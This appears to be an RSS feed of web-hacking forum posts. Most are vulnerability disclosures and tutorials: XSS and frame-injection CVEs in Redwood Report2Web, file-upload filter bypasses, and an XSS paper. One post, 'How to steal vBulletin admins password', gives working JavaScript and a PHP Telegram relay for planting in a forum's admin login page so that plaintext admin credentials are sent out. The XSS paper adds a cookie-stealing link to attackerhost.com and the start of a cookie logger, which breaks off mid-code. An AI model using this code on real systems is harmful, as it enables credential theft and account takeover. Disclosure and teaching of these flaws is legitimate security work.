<p>We had a rate limit and enterprise bypass. Once we reported it, it got fixed the same day. And IPinfo’s response was awesome</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/5/d/5d3d17f6b552355d05088e8b6a086c2ecad95455.png" alt="twittercomment" data-base62-sha1="diPiqrXMc91XJdMBIoscgzezg6V" width="589" height="199"></p>
<p>TL;DR: <a href="https://twitter.com/vict0ni/status/1417162552266661893">https://twitter.com/vict0ni/status/1417162552266661893</a></p>
            <p><small>2 posts - 2 participants</small></p>
            <p><a href="https://0x00sec.org/t/bypassing-the-ipinfo-api-feat-pry0cc/26656">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/bypassing-the-ipinfo-api-feat-pry0cc/26656</link>
          <pubDate>Sat, 24 Jul 2021 08:39:39 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-26656</guid>
          <source url="https://0x00sec.org/t/bypassing-the-ipinfo-api-feat-pry0cc/26656.rss">Bypassing the IPinfo API (feat. pry0cc)</source>
        </item>
        <item>
          <title>Redwood Report2Web CVE-2021-26710 and CVE-2021-26711</title>
          <dc:creator><![CDATA[vict0ni]]></dc:creator>
          <category>Web Hacking</category>
          <description><![CDATA[
            <p><a href="https://www.redwood.com/report-distribution">Redwood Report2Web</a> v4.3.4.5 and v4.5.3 are vulnerable to XSS. v4.3.4.5 is also vulnerable to frame injection. These are the vulnerable versions to the best of my knowledge. Both issues seem fixed after v4.6.0.</p>
<h2>Report2Web Login Panel XSS [CVE-2021-26710]</h2>
<p>The value of the <code>urll</code> parameter is getting reflected without any sanitization, allowing a remote attacker to inject javascript code to the victim’s browser, by using a simple payload <code>"&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
<p>Request:</p>
<pre><code class="lang-http">GET /r2w/signIn.do?urll=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E HTTP/1.1
Host: [HOST]
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en,en-US;q=0.7,de;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Cookie: JSESSIONID=F291E04B316ED2DF72623ACEA8D952CA; r2wctg=3
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
</code></pre>
<p>Response:</p>
<pre><code class="lang-auto">...
&lt;form name="form" action="signIn.do" method="post" onsubmit="return handleSubmit(this);"&gt;
 &lt;input type="hidden" name="id" value="" /&gt;
 &lt;input type="hidden" name="language" value="en" /&gt;
 &lt;input type="hidden" name="urll" value=""&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;" /&gt;
 
&lt;div class="outer"&gt;
...
</code></pre>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/3/b/3b591540c9d8892d4f246b78e4e8d4ce3b6ffba6.png" data-download-href="/uploads/short-url/8t11Sgx6Pv9NnVkgdl1GjEXjBpI.png?dl=1" title="xss"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/3/b/3b591540c9d8892d4f246b78e4e8d4ce3b6ffba6_2_690x151.png" alt="xss" data-base62-sha1="8t11Sgx6Pv9NnVkgdl1GjEXjBpI" width="690" height="151" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/3/b/3b591540c9d8892d4f246b78e4e8d4ce3b6ffba6_2_690x151.png, https://0x00sec.s3.amazonaws.com/optimized/3X/3/b/3b591540c9d8892d4f246b78e4e8d4ce3b6ffba6_2_1035x226.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/3X/3/b/3b591540c9d8892d4f246b78e4e8d4ce3b6ffba6_2_1380x302.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/3/b/3b591540c9d8892d4f246b78e4e8d4ce3b6ffba6_2_10x10.png"></a></div><p></p>
<h2>Report2Web Online Help Frame Injection [CVE-2021-26711]</h2>
<p>The <code>turl</code> parameter takes a local path as input and diplays it’s content inside a frame, e.g. <code>?turl=/local/path/doc.html</code>. Although LFI isn’t possible, you can bypass the protection by using <code>\/hostname.tld</code> which the browser translates to <code>//hostname.tld</code> and then to <code>https://hostname.tld</code>, loading an external resource inside the frame and leading to vulnerabilities like XSS and content injection.</p>
<p>Request:</p>
<pre><code class="lang-http">GET /r2w/help/Online_Help/NetHelp/default.htm?turl=\/example.com HTTP/1.1
Host: [HOST]
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en,en-US;q=0.7,de;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
</code></pre>
<p>Response:</p>
<pre><code class="lang-auto">...
&lt;frame id="right" name="right" title="Topic text" src="\/example.com"&gt;
...
</code></pre>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/6/e/6e9dd990f8c77355e66e54f754812a2919e20d11.png" data-download-href="/uploads/short-url/fMyIeONqJP9hHBsx0tFt1EhBoFr.png?dl=1" title="example"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/6/e/6e9dd990f8c77355e66e54f754812a2919e20d11_2_690x213.png" alt="example" data-base62-sha1="fMyIeONqJP9hHBsx0tFt1EhBoFr" width="690" height="213" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/6/e/6e9dd990f8c77355e66e54f754812a2919e20d11_2_690x213.png, https://0x00sec.s3.amazonaws.com/optimized/3X/6/e/6e9dd990f8c77355e66e54f754812a2919e20d11_2_1035x319.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/3X/6/e/6e9dd990f8c77355e66e54f754812a2919e20d11_2_1380x426.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/6/e/6e9dd990f8c77355e66e54f754812a2919e20d11_2_10x10.png"></a></div><p></p>
<hr>
<p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-26710" class="onebox" target="_blank" rel="noopener">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-26710</a><br>
<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-26711" class="onebox" target="_blank" rel="noopener">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-26711</a></p>
            <p><small>4 posts - 4 participants</small></p>
            <p><a href="https://0x00sec.org/t/redwood-report2web-cve-2021-26710-and-cve-2021-26711/24874">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/redwood-report2web-cve-2021-26710-and-cve-2021-26711/24874</link>
          <pubDate>Wed, 10 Feb 2021 12:41:14 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-24874</guid>
          <source url="https://0x00sec.org/t/redwood-report2web-cve-2021-26710-and-cve-2021-26711/24874.rss">Redwood Report2Web CVE-2021-26710 and CVE-2021-26711</source>
        </item>
        <item>
          <title>[vBulletin]: How to steal vBulletin admins password</title>
          <dc:creator><![CDATA[0x3D]]></dc:creator>
          <category>Web Hacking</category>
          <description><![CDATA[
            <p>Hello,</p>
<p>if you ever had the access to a server hosting a <strong>vBulletin</strong> forum, you would probably be able to access the admin panel by grabbing the database password from the config files, then change the admin encrypted password by your encrypted password from the database to access the admin panel,  but probably you’ll be out the server pretty soon.</p>
<p>but there’s a better solution which’s getting the admin plain text password, by a <strong>phishing attack</strong> or stealing his password using <strong>JavaScript</strong>, which I’ll be cover in this topic.</p>
<p>we could use <strong>PHP</strong> and get the password after the post request but <strong>vBulletin</strong> encrypts the password with <strong>MD5</strong> using <strong>JavaScript</strong> in the Client Side, so we’ll try to grab the password before it gets encrypted.</p>
<p>the script I’ll be using is:</p>
<pre><code>function mal()
{
	var xhr = new XMLHttpRequest();
	xhr.open("POST", "http://example/admindata.php", true);
	xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
	xhr.send("Data="+document.getElementById("vb_login_username").value + " " + document.getElementById("vb_login_password").value);
}
</code></pre>
<p>the given script grabs the password and sends it to a <strong>PHP</strong> script which then writes it to a file or sends it to you using <strong>telegram</strong> or with email, an example using <strong>telegram API</strong>:</p>
<pre><code>&lt;?php

if ($_SERVER['REQUEST_METHOD'] == "POST" &amp;&amp; isset($_POST['Data']))
{
$token = "YOUR_TOKEN";
file_get_contents("https://api.telegram.org/bot$token/sendMessage? 
chat_id=YOUR_CHAT_ID&amp;text=" . urlencode($_POST['Data'])."" );
}
else
    header("Location: https://google.com");
?&gt;
</code></pre>
<p>so now you can upload the <strong>PHP</strong> script on the same server or your server, or you can send the passwords directly from the <strong>JavaScript</strong>.</p>
<p>now we’ll have to edit the index page and add our <strong>JavaScript</strong> script to it and edit somethings to get everything done.</p>
<p>the index page is located in: <strong>./core/includes/adminfunctions.php</strong></p>
<p>add the <strong>javascript</strong> script inside a  tag, and edit this line :</p>
<pre><code>&lt;input type="submit" class="button" value="  &lt;?php echo 
$vbphrase['log_in']; ?&gt;  " accesskey="s" tabindex="3" /&gt; 
</code></pre>
<p>to:</p>
<pre><code>&lt;input type="submit" onclick="mal()" class="button" value="  &lt;?php echo 
$vbphrase['log_in']; ?&gt;  " accesskey="s" tabindex="3" /&gt;
</code></pre>
<p>and now wait for admins passwords, that’s it, peace out!</p>
            <p><small>3 posts - 2 participants</small></p>
            <p><a href="https://0x00sec.org/t/vbulletin-how-to-steal-vbulletin-admins-password/22112">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/vbulletin-how-to-steal-vbulletin-admins-password/22112</link>
          <pubDate>Mon, 06 Jul 2020 14:00:45 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-22112</guid>
          <source url="https://0x00sec.org/t/vbulletin-how-to-steal-vbulletin-admins-password/22112.rss">[vBulletin]: How to steal vBulletin admins password</source>
        </item>
        <item>
          <title>TOR, a WAF and luck?</title>
          <dc:creator><![CDATA[New001]]></dc:creator>
          <category>Web Hacking</category>
          <description><![CDATA[
            <p>Hey guys, hope you are doing great <img src="https://0x00sec.org/images/emoji/twitter/slightly_smiling_face.png?v=9" title=":slightly_smiling_face:" class="emoji" alt=":slightly_smiling_face:"><br>
I am about to set up a domain to use on the Onion network, I already have the domain name and the Apache and database set up.<br>
<strong>However</strong>, because this is going to be on my own network I want to try to be as safe as possible.<br>
Measures I’m taking are:</p>
<p>A Linux OS =&gt; behind a WAF =&gt; on it’s own VLAN =&gt; with VPN (Proton) =&gt; and then Tor.</p>
<p>That is basically how I picture the setup.<br>
No dynamic content nor JavaScript will run on the site.<br>
The intention is to avoid anyone from figuring out where I am, AND to keep the site safe from attacks to the best of my abilities.</p>
<p>What are your opinion on this?</p>
<p>Sorry for any spel errors, english is not my language, I checked but you never know.</p>
<p>Thanks for reading my first post. I appreciated.</p>
            <p><small>17 posts - 7 participants</small></p>
            <p><a href="https://0x00sec.org/t/tor-a-waf-and-luck/21592">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/tor-a-waf-and-luck/21592</link>
          <pubDate>Thu, 04 Jun 2020 02:24:18 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-21592</guid>
          <source url="https://0x00sec.org/t/tor-a-waf-and-luck/21592.rss">TOR, a WAF and luck?</source>
        </item>
        <item>
          <title>Insecure File Upload Vulnerability</title>
          <dc:creator><![CDATA[Kage]]></dc:creator>
          <category>Web Hacking</category>
          <description><![CDATA[
            <p>Alright guys… It has been so long since the last time I’ve written a blog post. So I’d like to apologize for my mistakes in advance.</p>
<p>Finally being done with finals, I had some time to spend on HackTheBox the other day. I’m not going to name the machine to avoid ruining people’s HTB adventures with spoilers, but I can say the user for the machine was web heavy.</p>
<blockquote>
<p>Oh this box is gonna be a breeze.</p>
</blockquote>
<p>At least that was my initial thought since my strong side is web. In order to get a shell on the machine, I had to exploit two different web vulnerabilities. The first one, widely known SQL Injection was a breeze. The second one, however, was not as easy as I thought. It was no other than the infamous Insecure File Upload vulnerability. After reading a bunch of tutorials, reference sheets and articles, I want to share what I learned about the particular vulnerability type.</p>
<p><strong>Disclaimer:</strong> This article is not a HackTheBox machine walkthrough, instead we we’ll be focusing on a vulnerability type that is still seen in wild and in CTFs.</p>
<p>Let’s dive right in.</p>
<h3>Protections Against File Upload</h3>
<p>Insecure File Upload vulnerability is basically abusing web application’s file upload functionality to upload a malicious file to the system like a reverse shell. In order for this attack to be impactful, we need a file upload that we can upload malicious files and we should know the location those malicious files are stored. Once accomplished, they can lead to Remote Code Executions.</p>
<p>Let’s look at the different ways developers try to protect against Insecure File Upload vulnerabilities.</p>
<h3>White-Listing File Extensions</h3>
<p>White-listing is basically checking and making sure the uploaded file’s extension is one of the allowed extension types. However, this approach is not flawless. There are a couple ways a white-list protection can be bypassed.</p>
<p>Let’s say our super-secure developer coded a file upload and used the following check as a white-list protection.</p>
<pre><code class="lang-php">&lt;?php
    $file = $_FILES['file']['name'];
    $extension = explode(".", $file)[1];
    if ($extension == "jpeg" || $extension == "jpg" || $extension == "png") {
        echo "File Uploaded";
        // Do the necessary operations
    } else {
        echo "Only JPG/JPEG and PNG files are allowed";
    }
?&gt;
</code></pre>
<p><strong>Note:</strong> Most of the code in this article will be in PHP as it is still the most common language used in CTFs and in the real world. However, the methods described in this article applies to other languages as well.</p>
<p>This file gets the filename from the user, trust the filename (<em>big mistake),</em> splits the filename from the dots and tries to get the filename. A malicious attacker can easily bypass this check by sending a file called shell.jpg.php . The code would get the filename, split it into  [‘shell’, ‘jpg’, ‘php’], check the element in the first index which is “jpg” and assume it is a safe image file. In reality, we just uploaded a php script that can give us a reverse shell in the target system.</p>
<p><strong>Is it always this easy?</strong></p>
<p>HELL NO! Although this is an example that can still be seen in wild, most web applications are more complex than that these days. Web languages and frameworks offer various methods/functions to fight against these types of vulnerabilities and developers are getting smarter everyday but so do the attackers.</p>
<p>Let’s talk about other ways to bypass the white-list protection. To keep the article brief, I’m not going to include code snippets for all of them but try to imagine the code in the back-end as we go through them.</p>
<p>Some developers try to check the last extension to prevent the bypass described above. Smarter ones utilize their programming language’s or framework’s <em>trusted</em> functions to check your input’s credibility. Even those <em>trusted</em> functions might not be as trustworthy as they seem. Due to the ways some of them interpret the given string, it is possible to bypass them.</p>
<pre><code class="lang-auto">shell.php?shell.jpeg
shell.php%00shell.png
</code></pre>
<p>Have a look at the filenames above. In some cases, <em>super secure functions</em> validate these as valid filenames. However, when it comes to calling and using the filename, system’s does not interpret them as those functions. If you are not familiar with C-like programming languages, null-byte (%00) indicates the end of a string. Therefore, some systems interpret that filename as shell.php, again letting us upload a shell.</p>
<p>This might not always work but null-byte injection is more common than you might think.</p>
<h3>Black-Listing File Extensions</h3>
<p>As an opposite approach to white-listing, black-listing file extensions marks some extensions (like .php, .sh etc.) to prevent a malicious attacker from running code on the servers. If not done correctly, this approach is easier to bypass than white-listing protection.</p>
<p>If the check in place only checks if the extension is .php, one can easily bypass the check by capitalizing letters like .PhP, or using other valid PHP extensions. There are many extensions you can use to make PHP code work.</p>
<p>Some of those extensions are:</p>
<ul>
<li>.php5</li>
<li>.pht</li>
<li>.phar</li>
</ul>
<p>More of those can be found in:</p>
<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20PHP" rel="nofollow noopener">swisskyrepo/PayloadsAllTheThings</a></p>
<h3>Content-Type Validation</h3>
<p>Another primitive check employed by developers is checking the content-type sent by the request to make sure it is an expected file-type. What they fail to realize is that just like every other field in a HTTP request, content-type can be modified by the user.</p>
<p><span alt="Screen_Shot_2020-05-25_at_3.38.42_PM" data-base62-sha1="cm2pY9vQe1XMc7dJefg68375BVN" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>A normal request to upload php code to the site.</p>
<p>This request can be modified to look like the following picture to avoid some server-side protection against file upload.</p>
<p><span alt="Screen_Shot_2020-05-25_at_3.40.07_PM" data-base62-sha1="4pfAEMXjVyHUKsRroSqt131AkRW" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>If the developer only checks the type using the user supplied Content-Type header, it is awfully easy to bypass this check.</p>
<h3>Content-Length Validation</h3>
<p>This is not a check I’ve run into in the wild or in the CTFs to I won’t dive into this bypass deeply. Having said that some resource state that there are applications that checks the content length to try and understand if the image file uploaded has a length that is more than usual.</p>
<p>Some of these checks can be bypassed changing the Content-Length header or embedding as short commands as possible. Instead of embedding a full-blown reverse shell like in the above image, the attacker can just embed commands one by one to gain RCE.</p>
<p>In my experience, it might be useful to embed the code in advance instead of changing the contents of the file in Burp Intercept, especially in CTFs. In some cases, applications check if the length of the content you’ve uploaded corresponds to the length in Content-Length header. So if you change the contents of the file when intercepted, the application might be able to detect that unless you change the Content-Length header too. This is particularly a good tip for the last, but certainly not least type of bypass that will be mentioned in this article.</p>
<h3>Magic Bytes Validation</h3>
<p>Let’s get into more fun stuff. As hackers come up with creative ways to break security mechanism, developers keep coming up with smarter code. Early on, we talked about a very primitive way to bypass server-side file upload protection: changing Content-Type header. Obviously, developers had to come up with a better approach to check the file type. One approach proposed is checking the magic bytes of files. Every file includes a couple bytes called magic bytes as the first bytes to identify the filetype. This is not dependent on file extension. You cannot change the magic bytes by just changing the filetype. Security mechanisms tend to check these bytes to validate the type of file. However, these bytes can easily be manipulated by the user.</p>
<pre><code class="lang-auto">GIF89a;
</code></pre>
<p>Sometimes adding the string seen above at the beginning of a file is enough to trick applications to interpret the file as a GIF file.</p>
<p>Another method I prefer is embedding the malicious code directly into a PNG/JPEG file. This is as easy as copying the code and pasting it somewhere in the PNG file (except for the beginning). Once done, you can check the file type using the following command in UNIX based systems.</p>
<p><span alt="Screen_Shot_2020-05-25_at_4.06.25_PM" data-base62-sha1="9Ec133NNzWfMiwDIrs4paR1XWVs" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>In order to get RCE with this method, you have to find a way to send the file with the relevant file extension (.php in this case). If the system successfully prevents you from uploading files with that file extension, you can’t run it once it is on the system. There are some examples, however, that let’s user get a working shell by sending files with double extensions such as reverse-shell.php.jpeg.</p>
<h3>Future Work</h3>
<p>Insecure File Uploads are not necessarily my strongest web vulnerability but I find the bypasses above interesting and the results can be devastating. While working on the HTB machine I mentioned before, I realized there is no de-facto tool to automatize insecure file upload tests. My next goal is writing a tool that can check such vulnerabilities automatically. This would be something like SQLMap but for file uploads. If you have ideas and want to help or if you already know a tool that can do this with high success rates, reach out to me.</p>
<h3>More To Read</h3>
<p>In this section, I’ll include some more links to read more about Insecure File Uploads and to practice exploiting them.</p>
<ul>
<li><a href="https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload" rel="nofollow noopener">OWASP Unrestricted File Upload</a></li>
<li><a href="https://0x00sec.org/t/unrestricted-cv-file-upload/20325">Vict0ni’s 0x00sec Post (Vulnerability He Found in the Wild)</a></li>
</ul>
<p>Please let me know if you have any suggestions or feedback.</p>
            <p><small>9 posts - 7 participants</small></p>
            <p><a href="https://0x00sec.org/t/insecure-file-upload-vulnerability/21448">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/insecure-file-upload-vulnerability/21448</link>
          <pubDate>Mon, 25 May 2020 23:45:45 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-21448</guid>
          <source url="https://0x00sec.org/t/insecure-file-upload-vulnerability/21448.rss">Insecure File Upload Vulnerability</source>
        </item>
        <item>
          <title>Suggestions for things to try on web app pentest exercise with limited avenues for attack?</title>
          <dc:creator><![CDATA[OnFOOFian]]></dc:creator>
          <category>Web Hacking</category>
          <description><![CDATA[
            <p>Hello all. First post here, hoping it is appropriate to this forum.</p>
<p>I am working on a web app pen test which is just a simple user login. I have one user account, and the “goal” is to try and gain access to a different users account, for which I have the username.</p>
<p>The web app is very simple. No javascript, super basic CSS. two form fields for login sent via POST, neither are injectable (I’ve done a ton of manual testing, and used sqlmap a bunch of times with different options).</p>
<p>One GET request for logout, no parameters. No form fields after logging in. No information leaked via directories or files made available when they shouldn’t be, no errors in misconfiguration, nothing so obvious.</p>
<p>There is one session cookie set which is a 10 digit random number. I have been thinking this is the avenue of attack, assuming it might store and load sessions from a table, but everything I have tried to inject just gets ignored by the server. No response to attempting time delays, no error responses, nothing, and sqlmap also doesn’t find anything when testing the cookie paramter.</p>
<p>Stuff like XSS, CSRF etc isn’t relevant at the moment.</p>
<p>So, suggestions for what I can try? I feel like I’ve tried everything. There must be more to try but I am at the limits of my knowledge. Can anyone give me some suggestions for more techniques I can read up on and start to attempt?</p>
            <p><small>11 posts - 5 participants</small></p>
            <p><a href="https://0x00sec.org/t/suggestions-for-things-to-try-on-web-app-pentest-exercise-with-limited-avenues-for-attack/20085">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/suggestions-for-things-to-try-on-web-app-pentest-exercise-with-limited-avenues-for-attack/20085</link>
          <pubDate>Fri, 27 Mar 2020 05:55:02 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-20085</guid>
          <source url="https://0x00sec.org/t/suggestions-for-things-to-try-on-web-app-pentest-exercise-with-limited-avenues-for-attack/20085.rss">Suggestions for things to try on web app pentest exercise with limited avenues for attack?</source>
        </item>
        <item>
          <title>Practical Applications of XSS</title>
          <dc:creator><![CDATA[Ph03n1x_Crus4d3r]]></dc:creator>
          <category>Web Hacking</category>
          <description><![CDATA[
            <h1>Practical Applications of Cross Site Scripting (XSS)</h1>
<h1>Prerequisites</h1>
<p>Throughout this paper, many scripting languages will be used to provide proof-of-concept and other examples for the benefit of the reader. A basic understanding of these languages is required in order to completely understand the concepts that are conveyed herein; that being said, a lack of knowledge in these areas should not deter you from reading on. The information contained within this document can, at least, provide you with a basic understanding of impacts of XSS attacks.</p>
<pre><code class="lang-auto">here is some  
code  
is it all on one line?  
</code></pre>
<h2>Terms of Use</h2>
<p>By reading this document, you agree to the following terms:<br>
I. I honestly could care less what you do with this info, but for my legal sanity, don’t do anything illegal.</p>
<p>II. You will hold neither this paper’s author nor its distributors liable for any actions taken that pertain to the information addressed in this document.</p>
<h1>Introduction</h1>
<h2>Definition</h2>
<p>Cross site scripting, commonly known by its acronym, XSS, is a type of computer security vulnerability that involves the injection of code into web pages by means of web applications. During the execution of an XSS attack, information from one entity, where it is not trusted, is transferred to another entity, where it is trusted. The transferred information may be comprised of session data, sensitive page content, compromising user data, or a variety of other objects.</p>
<h2>History</h2>
<p>Cross site scripting has existed since Netscape introduced the JavaScript language in the early 1990s. In fact, Netscape was at least moderately aware of the security risks associated with allowing a web server to send executable code to a browser (even if only in a browser sandbox). In some instances, a script from one page should be allowed to access data from another page or object, but in others, this should be strictly forbidden, as a malicious website could attempt to steal sensitive information this way. For this reason, the Same Origin Policy was introduced.</p>
<h2>Same Origin Policy</h2>
<p>Essentially, the Same Origin Policy allows any interaction between objects and pages, as long as those objects and/or pages are using the same domain name, application layer protocol, and, in most browsers, TCP port of the web page running the script. This way, a malicious website wouldn’t be able to access sensitive data in another browser.</p>
<p>Since the implementation of the Same Origin Policy, other access control policies have been integrated within browsers and client-side scripting languages to protect users from malicious attacks. Cross Site Scripting holes can be seen as vulnerabilities that allow attackers to bypass these mechanisms.</p>
<h1>First Order</h1>
<p>This vulnerability arises when data is submitted to a web application by a user, then stored nonpersistently, and later reflected back and displayed to the user who issued the request. Typically, the application accepts a parameter containing user-supplied data and simply renders that data back to the user in its response without proper filtration or sanitization.</p>
<p>First Order XSS bugs account for approximately 75% of all Cross Site Scripting vulnerabilities encountered on the internet. The term First Order XSS is used because this type of attack introduces a payload that is delivered and executed by means of a single request and response.</p>
<h2>Discovery</h2>
<p>The most effective approach to detecting first order XSS vulnerabilities is as follows:<br>
Choose a web application target</p>
<ol>
<li>Create a unique arbitrary string that does not appear similar to any data on the web site of the web application target. The string you decide to use should only contain alphabetic characters, to avoid any existing filtration and sanitization methods.</li>
<li>Submit the string to the application in each parameter individually, until every parameter has been targeted.<br>
3, Review the application’s response to each request and annotate any instances of the arbitrary string that were returned.</li>
<li>Use the methods described in the next sections to test for Cross Site Scripting vulnerabilities in the parameters that correspond to the instances you recorded.</li>
<li>Repeat steps one through five to test other applications on the target web site.</li>
</ol>
<h2>Exploitation</h2>
<p>The purpose of this sub-section is to provide an aid in understanding Cross Site Scripting exploitation through real-world examples of XSS attacks. Each of the examples below is designed to emulate a commonly encountered attack scenario on the web.</p>
<h2>Virtual Defacement</h2>
<p>This type of First Order XSS attack involves injecting a maliciously crafted string into a vulnerable application, which has the ability to alter the contents of a page on the client-side, creating a virtual mask over the actual contents that the server sends to the browser</p>
<p>Virtual Defacement attacks usually require users to take some sort of action. This may simply involve clicking a link that injects malicious data into a page of a target website, or visiting a malicious website that redirects visitors to a target website, sending nefarious code with the request.</p>
<h3>Example No. One</h3>
<p><strong>Target</strong> - <a href="http://www.fakenationalnews.com/" rel="nofollow noopener">http://www.fakenationalnews.com/</a><br>
<strong>Intention</strong> - Mass Hysteria/Panic</p>
<p>In society, we are constantly flooded with images and messages from the media. This includes, but is not limited to, movies, books, television, newspapers, advertisements and the internet. The topics presented by the media have a substantial influence on how we live our lives. This makes Virtual Defacement a very powerful and imaginably desolating tool. What would happen if a person with villainous intentions found a means to change the content displayed by a popular news website to comply with those villainous intentions. The affects of his doing so could cause people to panic, and could even generate consequences that would take years to<br>
repair.</p>
<p>An attacker could:</p>
<ul>
<li>Set up a website that contains information on the devious topic of his choosing along with crafted reference links to the Fake National News website.</li>
<li>Send an email out that contains information on the topic and a link to the Fake National News.</li>
<li>Post the link on a widely used forum.</li>
</ul>
<p>The link to the news website could be manipulated to incorporate XSS attacks designed to allow the attacker to virtually deface the website. Upon clicking the link, the code would be sent as a request to a vulnerable application on the Fake National News server.</p>
<p>The source of the iframe is directed to a page on the attacker’s website, which is an altered version of the content found on the actual news site. The iframe would cover the entire Fake National News website, so any viewing users would be reading the nefarious content that was set up by the attacker.</p>
<p>An image tag is used to inject JavaScript that would temporarily (nonpersistently) rewrite the site content that the user requested to view. An example of the fake site content is as follows:</p>
<h3>Example No. Two</h3>
<p><strong>Target</strong> - <a href="http://www.fakestockstrading.com/" rel="nofollow noopener">http://www.fakestockstrading.com/</a><br>
<strong>Intention</strong> - Financial Gain and Mass Hysteria</p>
<p>In addition to causing mass panic, an attacker could also use a Virtual Defacement attack payload for financial gain. Causing a user to visit a stock trading website that has been virtually defaced might cause that user to make a poor decision that would benefit the attacker, such as selling stocks when it would be more appropriate to buy more of the same stock. The attacker may have crafted code to show an exponential decline in stock value, causing other users to sell their stocks at low prices, and then could purchase them himself at a much lower rate than the rate originally set.</p>
<h2>Session Hijacking</h2>
<p>This XSS attack is more commonly used by attackers than any other type of XSS exploitation technique. It involves injecting specifically constructed code that enables an attacker to request user session data via a vulnerable application. The injected code then issues a response, passing the requested data to an external malicious website to be logged.</p>
<p>Depending on the target website, the target application, the target audience of users, and an assortment of other factors, minor to moderate levels of social engineering are required to successfully execute this type of attack. The tactics used range from posting manipulated external links along with controversial information on public discussion forums, drawing out curious netizens, to creating elaborate email scams that appear to come from a trusted source.</p>
<h3>Example No. One</h3>
<p><strong>Target</strong> - <a href="http://www.fakebank.com" rel="nofollow noopener">http://www.fakebank.com</a><br>
<strong>Intention</strong> - Financial Gain</p>
<p>An attacker set up a website that contains legitimate financial advice and an array of links to different financial institutions. The links to each and every financial institution were manipulated to incorporate XSS attacks designed to allow the attacker to hijack the sessions of users who are susceptible to attack. Upon clicking a link, the following code will be sent as a request to a vulnerable application on <a href="http://www.fakebank.com" rel="nofollow noopener">http://www.fakebank.com</a>. The iframe is one pixel by one pixel in size, so the probability of users finding out that their sessions are being hijacked is less than it would be if one was to use a JavaScript redirect, for example. Below is an example of a maliciously<br>
crafted link.</p>
<pre><code class="lang-auto">&lt;a href='http://www.fakebank.com/viewaccountinfo.php?info=&gt;&lt;iframe width=1 height=1 scrolling=no  

src=‘http://www.attackerhost.com/cookielogger.php?cookie=’+unescape(document.cookie)&gt;‘&gt;FakeBank
Online
</code></pre>
<p>Upon clicking the link, the user’s cookie would be transferred, through the iframe, to an external script on <a href="http://www.attackerhost.com" rel="nofollow noopener">http://www.attackerhost.com</a>. The external script would then write the cookie to a log file for later use. An example of a functional cookie-logging script is as follows:</p>
<pre><code class="lang-auto">&lt;?php  
    $filename = 'logfile.txt';  
    if (is_writable($filename)) {  
        if (!$handle = fopen($filename, 'a')) {  
            echo "Cannot open file ($filename)";  
